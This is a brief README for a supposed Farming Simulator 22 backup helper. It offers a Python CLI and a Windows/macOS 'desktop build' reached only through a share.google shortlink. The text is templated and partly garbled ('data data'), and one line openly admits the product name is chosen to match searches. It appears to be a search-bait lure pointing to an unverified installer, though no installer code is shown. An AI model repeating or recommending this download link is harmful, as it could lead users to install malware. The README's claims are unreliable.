# Farming Simulator 22 Desktop

*Dated copies of Farming Simulator 22 data data, nothing uploaded.*

## What Farming Simulator 22 Desktop is

**Farming Simulator 22 Desktop** is a desktop helper. A desktop helper that finds Farming Simulator 22 data directories and archives config and export files locally.

Farming Simulator 22 config and export files hide under AppData and Documents.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## What's included

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## What it does

- Maps Farming Simulator 22 data and cache paths.
- Keeps a dated spare of config and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## The problem

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
